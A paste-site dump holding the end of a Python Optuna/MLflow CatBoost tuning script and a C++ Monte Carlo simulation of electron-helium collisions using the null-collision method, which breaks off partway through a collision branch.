    mlflow.log_metric(""auc"", auc)
    mlflow.log_metric(""precision"", precision)
    mlflow.log_metric(""recall"", recall)
    mlflow.log_metric(""f1"", f1)
    mlflow.log_metric(""logloss"", logloss)
    
    # mlflow.end_run()

    return auc

with mlflow.start_run(run_name=RUN_NAME, experiment_id=experiment_id) as run:
    run_id = run.info.run_id

    # MLflow Callback
    mlflc = MLflowCallback(
        tracking_uri=f'http://{TRACKING_SERVER_HOST}:{TRACKING_SERVER_PORT}',
        metric_name=""AUC"",
        # create_experiment=False, # –Ω–µ –Ω—É–∂–Ω–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å —ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç –∫–∞–∂–¥—ã–π —Ä–∞–∑
        mlflow_kwargs = {'experiment_id': experiment_id, 'tags': {'run_id': run_id}}
    )

    study = optuna.create_study(direction='maximize', 
                                study_name=STUDY_NAME, 
                                storage=STUDY_DB_NAME,
                                load_if_exists=True, 
                                sampler=optuna.samplers.TPESampler())

    study.optimize(objective, 
                    n_trials=10, 
                    callbacks=[mlflc])
    best_params = study.best_trial.params



    # –°–æ–∑–¥–∞–µ–º –º–æ–¥–µ–ª—å —Å –ª—É—á—à–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    best_model = CatBoostClassifier(**best_params,
                                    auto_class_weights='Balanced',  
                                    cat_features=cat_cols,
                                    loss_function=""Logloss"", # –Ω—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å —è–≤–Ω–æ, —Ç.–∫. –µ–≥–æ –Ω–µ—Ç –≤ best_params
                                    task_type=""CPU"",
                                    random_seed=555,
                                    verbose=False)

    # –û–±—É—á–∞–µ–º –º–æ–¥–µ–ª—å –Ω–∞ –í–°–ï–ú —Ç—Ä–µ–Ω–∏—Ä–æ–≤–æ—á–Ω–æ–º –Ω–∞–±–æ—Ä–µ
    best_model.fit(X_train, y_train)

    # –õ–æ–≥–∏—Ä—É–µ–º –º–æ–¥–µ–ª—å –≤ MLflow
    # –ö–æ–¥ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –º–æ–¥–µ–ª–∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤–Ω–µ —Ü–∏–∫–ª–∞ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑ –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ Optuna –∑–∞–≤–µ—Ä—à–∏—Ç –ø–æ–∏—Å–∫ –ª—É—á—à–∏—Ö –≥–∏–ø–µ—Ä–ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤.
    mlflow.catboost.log_model(
        cb_model=best_model,
        artifact_path=""models"", # –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –º–æ–¥–µ–ª–∏
        registered_model_name=REGISTRY_MODEL_NAME,
        pip_requirements=pip_requirements,
        signature=signature,
        input_example=input_example,
        await_registration_for=await_registration_for  
        )
    print(""Best model logged to MLflow."")
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –∑–∞–ø—É—Å–∫–µ —ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞ –ø–æ –µ–≥–æ —É–Ω–∏–∫–∞–ª—å–Ω–æ–º—É –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—É
    run = mlflow.get_run(run_id)


    print(f""Number of finished trials: {len(study.trials)}"")
    print(f""Best params: {best_params}"")
    print(f""–î–∞–Ω–Ω—ã–µ –æ –∑–∞–ø—É—Å–∫–µ\n{run}"")"
HVcDujRN,nu_max_recalculation_same_mean_energy_problem,phystota,C++,Wednesday 16th of April 2025 07:27:31 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state

// simulation parameters

#define n_e 100000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 5.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 4000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 3.0E-4 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.1 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        // Linear extrapolation using last two points
        const auto& last = CS[CS.size() - 1];
        const auto& prev = CS[CS.size() - 2];
        double slope = (last.sigma - prev.sigma) / (last.energy - prev.energy);
        return std::max(0.0, last.sigma + slope * (energy - last.energy));      
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 10000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    // std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    // std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //

    int print_interval = 100;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double total_time = 3.0E-3; // Your original `time` constant
    double t_elapsed = 0.0;

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;

        double energy = Emin + (i + 0.5) * bin_width;

        // Total collision frequency for this energy bin
        double sigma_total = 
            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;

        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }

    std::cout << nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995

    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    

        std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";

        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
        std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of triplet excited atoms indices
        std::vector<int> excited1_indices(exc_1.size());
        std::iota(excited1_indices.begin(), excited1_indices.end(), 0); // fill with index
        std::shuffle(excited1_indices.begin(), excited1_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of singlet excited atoms indices
        std::vector<int> excited2_indices(exc_2.size());
        std::iota(excited2_indices.begin(), excited2_indices.end(), 0); // fill with index
        std::shuffle(excited2_indices.begin(), excited2_indices.end(), gen); // shuffle the indexes    

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;


        // calculating mean energy 
        double total_energy = 0.0;
        for (const auto& e : electrons) total_energy += e.energy;
        double mean_energy = total_energy / n_e;
        file8 << t_elapsed << "" "" << mean_energy << ""\n"";            


        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- ///
        for (int idx : electron_indices) {

            // Update velocity component due to electric field
            double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * dt;

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = 0.5 * m_e * (vx*vx + vy*vy + vz*vz) / q;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic1 = (N_He/Volume) * inelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic1 = (exc_1.size()/Volume) * superelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic2 = (N_He/Volume) * inelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic2 = (exc_2.size()/Volume) * superelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron
 
                // randomize particles each collision
 
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;
 
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                if (cos_khi >= 1)
                    cos_khi = 1.0 - dopant;
                if (cos_khi <= -1)
                    cos_khi = -1.0 + dopant;
                                     
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities  
 
                double delta_E = 2.0*(m_e/M_n)*(1.0 - cos_khi)*E_0;
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }     
                else {                           
                    e.energy = E_0 - delta_E;
                }
                
 
                double speed = sqrt(2*e.energy*q/m_e);
 
                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;              
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
